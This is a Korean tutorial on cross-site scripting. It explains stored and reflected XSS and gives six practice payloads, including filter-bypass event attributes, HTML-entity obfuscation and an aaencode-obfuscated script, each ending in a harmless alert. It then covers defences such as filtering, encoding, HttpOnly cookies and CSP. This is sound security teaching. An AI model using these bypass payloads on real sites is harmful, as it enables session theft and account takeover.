# XSS
**XSS(Cross-Site Scripting)**

SQL injection과 함께 웹 상에서 가장 기초적인 취약점 공격 방법의 일종으로, 악의적인 사용자가 공격하려는 사이트에 스크립트를 넣는 기법을 말한다. 공격에 성공하면 사이트에 접속한 사용자는 삽입된 코드를 실행하게 되며,[2](#XSS-예시) 보통 의도치 않은 행동을 수행시키거나 쿠키나 세션 토큰 등의 민감한 정보를 탈취한다.

공격 방법에 따라 Stored XSS와 Reflected XSS로 나뉜다. Stored XSS는 사이트 게시판이나 댓글, 닉네임 등 스크립트가 서버에 저장되어 실행되는 방식이고, Reflected XSS는 보통 URL 파라미터(특히 GET 방식)에 스크립트를 넣어 서버에 저장하지 않고 그 즉시 스크립트를 만드는 방식이다. 후술된 내용 대부분은 Stored XSS라고 생각하면 된다. Reflected XSS의 경우 브라우저 자체에서 차단하는 경우가 많아 상대적으로 공격을 성공시키기 어렵다.

크로스 사이트 스크립팅이란 이름 답게, 자바스크립트를 사용하여 공격하는 경우가 많다. 공격 방법이 단순하고 가장 기초적이지만, 많은 웹사이트들이 XSS에 대한 방어 조치를 해두지 않아 공격을 받는 경우가 많다. 여러 사용자가 접근 가능한 게시판 등에 코드를 삽입하는 경우도 많으며, 경우에 따라서는 메일과 같은 매체를 통해서도 전파된다. 심지어는 닉네임에 코드를 심기도 한다.

물론, HTML을 사용하는 것이기 때문에, Text-Only 게시판이나, BBCode를 이용하는 위키위키 등에서는 XSS가 발생할 일은 없다. 단, 나무위키의 경우 {{{#!html HTML}}} 을 이용해서 HTML 태그를 사용할 수 있으므로 취약점이 있을 수도 있다. 나무위키 초반에는 스크립트 태그와 이벤트 속성도 막지 않았으나 이는 모두 수정되었다.

주로 CSRF를 하기 위해서 사용되기 때문에 종종 CSRF와 혼동되는 경우가 있으나, XSS는 자바스크립트를 실행시키는 것이고, CSRF는 특정한 행동을 시키는 것이므로 다르다.

## XSS 공격
해커의 홈페이지에 PHP 파일을 만들고, 공격할 사이트에 스크립트를 심은 뒤, 사용자가 스크립트가 심어진 페이지를 볼 경우, 쿠키값이 해커의 홈페이지로 넘어가서 세션 하이재킹이 가능해진다.

### XSS 공격 실습

#### XSS 실습 1. 스크립트 태그
스크립트 태그로 자바스크립트를 실행한다.  
```html
<script>alert('XSS');</script>`
```

안타깝게도, 매우 정직한 방법이라 대부분의 사이트에서 막는 경우가 많다. 브라우저단에서 필터링 해주는 경우도 있다. 하지만 만들어진 지 몇십 년 이상 되었거나, 보안은 개나줘버린 사이트도 더러 있다. 애초에 비밀번호를 평문/MD5로 저장하는 경우도 있는다

### XSS 실습 2. JS 링크
링크 태그로 자바스크립트를 실행한다.  
```html
<a href="javascript:alert('XSS')">XSS</a>
```
브라우저에서 'about:' 링크와 같이, javascript: 로 시작하는 링크는 스크립트를 실행시킨다. 스크립트 태그와 같이, javascript:를 필터링하는 경우가 많아 많은 사이트에서 막는다.

### XSS 실습 3. 이벤트 속성 사용
이벤트 속성을 사용한다.
```html
<img src="#" onerror="alert('XSS')">
```
이벤트 속성으로 스크립트를 실행할 수 있다. 주로 on 으로 시작하는 속성이 이벤트 속성이다. 자주 사용되는 이벤트 속성으로는 onload onerror onclick 등이 있다. 물론, 이 방법 역시 '자바스크립트 링크' 방법만큼 많이 막혔다.

### XSS 실습 4. 블랙리스트 우회
알려지지 않은 태그와 속성들을 사용한다.
```html
<ruby oncopy="alert('XSS')">XSS</ruby>
```
블랙 리스트 방식으로 막는 사이트에 사용할 수 있다. [이벤트 속성 목록](https://www.w3schools.com/jsref/dom_obj_event.asp)을 참고. 위의 방법들보다는 적게 막혔으나, 여전히 최근 웹사이트들에선 화이트리스트 방식 차단이 대부분이라, 막혔을 가능성이 높다.

### XSS 실습 5. 난독화
따옴표로 감싸는 문자열 사이에 공백 문자들을 넣고, HTML 인코드를 하여 난독화한다.
```html
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#xA;&#x63;&#x72;&#x69;&#x70;&#x74;&#xA;&#x3A;&#xA;&#x61;&#x6C;&#x65;&#x72;&#x74;&#xA;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">XSS</a>
```
일부 브라우저에서 javascript: 링크 사이에 공백 문자가 들어갈 수 있고, HTML 인코드를 해도 디코드된 내용이 출력된다는 점을 이용한다. 여기에서는 '자바스크립트 링크' 방법과 사용하였지만, 당연히 다른 방법과 함께 사용할 수 있다.

### XSS 실습 6. 스크립트 난독화
[aaaencode](https://utf-8.jp/public/aaencode.html)에서 자바스크립트 난독화. 
<details><summary>예제 펼치기•접기 </summary>
```code
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ) ['c']+ (ﾟДﾟ) [ﾟΘﾟ]+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ (c^_^o)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟωﾟﾉ+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (o^_^o)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ (ﾟДﾟ) .ﾟДﾟﾉ+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```
</details>
스크립트를 귀여운 '카오모지'들로 난독화한다.스크립트 실행은 가능하지만, document.cookie와 같은 단어를 막을 경우 사용하면 된다.

## XSS 방어 : 차단과 무력화

XSS를 막는 두 가지 핵심 방어책이 있는데, 핵심은 '차단과 무력화'이다 그리고 이걸 입력(Input) 단계와 출력(Output) 단계로 나눠서 생각하는 게 좋다.  

입력 단계 (Input): 사용자가 데이터를 서버로 보낼 때, 화이트리스트(Whitelist) 방식으로 안전한 데이터만 걸러내는 것. (예: 게시판 제목에 `<`나 `>` 같은 특수 문자는 아예 못 쓰게 막아버리기)  

출력 단계 (Output): 서버에서 사용자에게 데이터를 보여줄 때, 위험할 수 있는 문자를 HTML 인코딩을 통해 무력화하는 것. (예: 게시판 본문에 `<script>` 코드가 있다면 `&lt;`script`&gt;`로 변환해서 보여주기)

XSS는 데이터를 입력할 때와 출력할 때, 모두 필터링하고, 클라이언트에도 막을 수 있을만한 수단을 구성해놓는 것이 좋다. 
보안은 한없이 덧대도 끝이 없고, 아래 서술한 방식으로 구성해도 기어코 뚫어버리는 사람들이 존재하기 때문이다.
### XSS 방어/Filter 입력 필터 단계: 차단

- **`JAVA`** 기반 앱서버 라면 적당한 XSS 필터구현하여,모든 요청의 파라미터가 해당 필터를 거치도록 하는 것만으로도 좋은 효과를 볼 수 있다. 
  
- **`PHP`** 입력을 처리할 때, 정규식을 이용하는 preg_replace를 사용하거나, 노드를 이용하는 DOMDocument를 사용할 수 있다. 속도는 preg_replace가 더 빠르지만, 정규식의 경우 예외와 오류가 종종 발생하기 때문에, 더 안전한 **DOMDocument를 사용하는 것이 권장된다.**

- **`필터-블랙&화이트 리스트`**
    > 단순히 텍스트만 입력시키거나 출력하는 필터를 제작할 때, 주로 필터되는 것이 괄호(`<`,`>`)이다. 각각 `&lt;`와 `&gt;`처럼 HTML 문자로 바꾸어서 스크립트 코드가 아닌 단순 문자로 인식하게 하는 것이다.
    하지만, 이 경우는 모든 HTML 태그를 막아버리기 때문에, 각종 스타일을 적용시켜야 하는 사이트에서는 맞지 않을 수도 있다.  

  - `블랙리스트 필터` (비권장): 위험하다고 알려진 특정 키워드나 패턴을 차단.  
    > 공격자들이 계속해서 새로운 공격 패턴을 만들어내면 방어에 실패할 수 있음
    
    > 예를 들어, 각종 스타일을 적용시켜 글을 꾸며야 하는 사이트의 경우, 스크립트 태그와 이벤트 속성, `javascript:` 링크만 제대로 막아주어도 상당수를 막을 수 있을 것이다. 하지만, EMBED 태그를 이용하여 저런 기법을 사용하지 않고도 XSS를 먹이는 경우가 있으므로, 다른 것들도 모두 막아주어야 한다. 이렇게 몇몇 태그만 막는다면 HTML 태그나 속성이 추가될 수록 주기적으로 필터를 수정해줘야 하는데, 이럴 경우 HTML 표준을 주기적으로 꼼꼼히 챙겨보지 않는 한은 업데이트를 하는 사이에 이미 해커가 침투해놓고 유유자적하게 빠져나갔을 수도 있다.    

  - `화이트리스트 필터` (덜 비권장): 안전하다고 증명된 특정 키워드나 패턴만 허용하고  나머지는 모두 차단.
    > 예상치 못한 새로운 공격 패턴에도 강력하게 대응 가능.
    예를 들면 클라이언트로부터 "게시글 제목"을 입력 받을 때
    특수문자 입력 금지 로직 같은걸 넣어도 사용자 경험에 별로 해가되지 않는다.
    > 블랙리스트 처럼 일부 태그 및 속성만 막기 보다는, 반대로 일부 태그 및 속성만 허용하게 하는 것.

    그리고 이 두가지 방법보다 더 좋은 방법은 **오픈 리스트 템플릿을 이용**하는 것. 개인이나 소규모 단체가 만든 것 보다는, 전문적인 보안 업체나 거대 기업에서 만든 것으로다가 쓰면 된다. [OWASP Antisamy](https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project "https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project")이나 [NAVER Lucy XSS Filter](https://github.com/naver/lucy-xss-filter "https://github.com/naver/lucy-xss-filter"), ESAPI 등을 이용하는 방법이 있다.  


- **`BBCode 사용`**
    > 글을 꾸며야 하지만, 따로 필터를 만들긴 어려운 경우, BBCode를 사용할 수도 있다. 만들기도 다른 방법에 비해 편하고, 안전성도 높은 편이기 때문에 가장 추천되는 방법이다. 또한 <나 > 같은 HTML 코드를 단순 문자로 바꿀 수 있기 때문에 XSS가 실행될 염려가 적다. 하지만 이때, 정규식과 같이 단순히 문자열 치환으로 수정할 경우, XSS가 발생할 수도 있다.  

### XSS 방어/Filter. 출력 단계 : 무력화
HTML5부터 iframe의 sandbox 옵션으로 iframe 내의 자바스크립트, 폼과 같은 것의 제한이 가능해졌으므로, 위의 방법을 실행한 뒤 2차적으로 써보는 것도 좋다. 단, 어디까지나 2차로만 사용하는 것이 좋다. 구버전의 웹 브라우저라면 호환이 되지 않아 스크립트가 그대로 실행되거나, 설령 그게 아니더라도 웹 브라우저에서 취약점이 발견될 경우, 이런 방법이 뚫릴 수 있기 때문이다.  
  
iframe은 단순히 다른 웹사이트를 불러오는 것만이 아니라, 부모 창에서 마음대로 수정할 수 있기 때문에, 무식하게 다른 페이지를 불러오며 AJAX나 PJAX 등을 포기하며 사용하지 말자. 물론, 기존부터 라이브러리를 사용하지 않고 웹 페이지를 개발하는 사람은 물론이고, jQuery같은 라이브러리를 사용하는 사람들도 조금만 검색해보면 간단하게 iframe의 내용을 수정할 수 있는 방법이 나오니 도전해 보도록 하자.  

### XSS 방어/Cookie Secure option. : HttpOnly와 Secure  
```js
// 쿠키는 이렇게 생겼다.
name=value; Domain=example.com; Path=/; Expires=Sat, 14 Aug 2025 10:00:00 GMT; HttpOnly; Secure
``` 
먼저, 쿠키는 로그인 세션처럼 중요한 정보를 담고 있는 경우가 많아서, XSS 공격자들이 가장 노리는 대상 중 하나이다. 실제로 XSS 공격으로 심어놓은 악성 스크립트가 사용자의 쿠키를 훔쳐서 공격자에게 보내는 경우가 많았다.
이 쿠키는 인증서이기 때문에 공격자는 그 쿠키를 자신의 브라우저에 심어놓고 마치 본인이 원래 사용자인 것처럼 웹사이트에 접근할 수 있게 됨.예전엔 세션쿠키방식으로 된 웹사이트가 많았다..

"쿠키 생성시엔 파라미터를 옵션을 선택할 수 있다."

  - **`HttpOnly`**라는 파라미터 옵션을 설정하면, 자바스크립트로 쿠키에 접근하는 걸 막을 수 있다. 브라우저가 이 옵션이 설정된 쿠키를 보면, `document.cookie` 같은 자바스크립트 명령으로는 절대로 쿠키를 읽거나 수정하지 못하게 막아준다.

  - **`Secure`**'라는 파라미터를 지정하면 암호화되지 않은 통신으로 쿠키가 전송되는 것을 막아줘요.
  [TLS](https://namu.wiki/w/TLS "TLS")상에서만 사용하게 할 수 있으며, 'HttpOnly'라는 파라미터로 웹 브라우저상에서만 쓸 수 있게 할 수도 있다. 물론 완전히 방어 가능한 건 아니다. Let's Encrypt 같은 TLS 인증서 생성 솔루션으로 공격자가 참 쉰게 TLS 환경을 구축할 수 있고 악성 확장 프로그램, 유저스크립트가 깔리면 쉽게 쿠키를 탈취 가능하다. 따라서 해결법과 병행하는 것이 좋다.  

### XSS 방어/콘텐츠 보안 정책(Content Security Policy, CSP) :
스크립트 실행에 대한 정책(조건)스코프를 설정할 수 있다.
서버는 CSP 스코프를 HTTP 헤더에 담아 브라우저에게 보내고, 브라우저는 그 규칙을 보고 다른 웹사이트에서 온 콘텐츠는 함부로 불러오지 않게 되는 원리이다.

이로ㅓ써 알 수 없는 스크립트가 실행되는 것을 예방할 수 있다. 원래는 외부 서버의 스크립트 파일이 script 태그나 iframe 등 사이트에 로드가 되면 스크립트가 실행되지만, CSP를 설정해 출처가 자기 서버인 스크립트만 실행되도록 할 수 있다. 물론 이는 어디까지나 완전 방어가 아닌 예방의 차원이라는 것을 알아둬야 한다.  

## 기타

위 방법들과는 별개로 일반 사용자가 스크립트를 잘 알지 못하는 것을 악용하여, 사용자가 브라우저 콘솔에 악성 스크립트를 삽입해 실행되도록 속이기도 하는데, 이를 스스로 하는 XSS라는 뜻의 Self XSS라고 부른다. 이는 사용자가 스스로 실행한 것이니만큼 위 방어 방법으론 막기 어려우니, 잘 알지 못하는 스크립트 등은 절대로 실행해서는 안 된다.
  
OWASP에서 XSS 공격을 방지하는 7계명을 발표하기도 했다. 

> 0. 허용된 위치가 아닌 곳에 신뢰할 수 없는 데이터가 들어가는것을 허용하지 않는다.  
> 1. 신뢰할 수 없는 데이터는 검증을 하여라.  
> 2. HTML 속성에 신뢰할 수 없는 데이터가 들어갈 수 없도록 하여라.  
> 3. 자바스크립트에 신뢰할 수 없는 값이 들어갈 수 없도록 하여라.  
> 4. CSS의 모든 신뢰할 수 없는 값에 대해서 검증하여라.  
> 5. URL 파라미터에 신뢰할 수 없는 값이 있는지 검증하여라.  
> 6. HTML 코드를 전체적으로 한번 더 검증하여라.